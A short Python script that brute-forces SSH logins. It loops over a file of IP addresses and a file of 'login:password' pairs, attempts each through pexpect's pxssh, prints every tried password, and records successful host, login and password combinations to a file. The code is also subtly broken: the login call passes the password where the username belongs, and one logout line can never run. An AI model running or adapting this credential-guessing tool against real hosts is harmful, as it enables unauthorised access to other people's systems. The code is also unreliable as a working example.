import file_service
from pexpect import ExceptionPexpect, pxssh


def connection_ssh(ip,user,pswd):
    s = pxssh.pxssh()
    try:
        if not s.login (ip, pswd, pswd):
            return False
            s.logout()
        else:
            s.logout()
            return True
    except ExceptionPexpect as e:
        return False

    	
def run_ssh_login_attempts(ip_file_name,login_pswd_file_name,file_name_ssh_cxn_found):
    file_ip = file_service.get_file(ip_file_name, 'r')
    addresses = file_ip.readlines()

    file_login_pswd = open(login_pswd_file_name, 'r')
    logins_pswds = file_login_pswd.readlines()
    
    file_ip.close()
    file_login_pswd.close()
    ssh_cxn_found = 0
    
    for address in addresses:
        for line in logins_pswds:
            splited= line.split(":")
            check_ssh_connexion = connection_ssh(address,splited[0],splited[1])
            print("check ssh connexion ip:",address.replace('\n',""),"login:", splited[0]," password:",splited[1].replace('\n',"")," success:",check_ssh_connexion)
            if check_ssh_connexion:
                file_service.generated_file(file_name_ssh_cxn_found,[address.replace('\n',"")+":"+splited[0]+":"+splited[1].replace('\n',"")])
                ssh_cxn_found= ssh_cxn_found+1
    return ssh_cxn_found
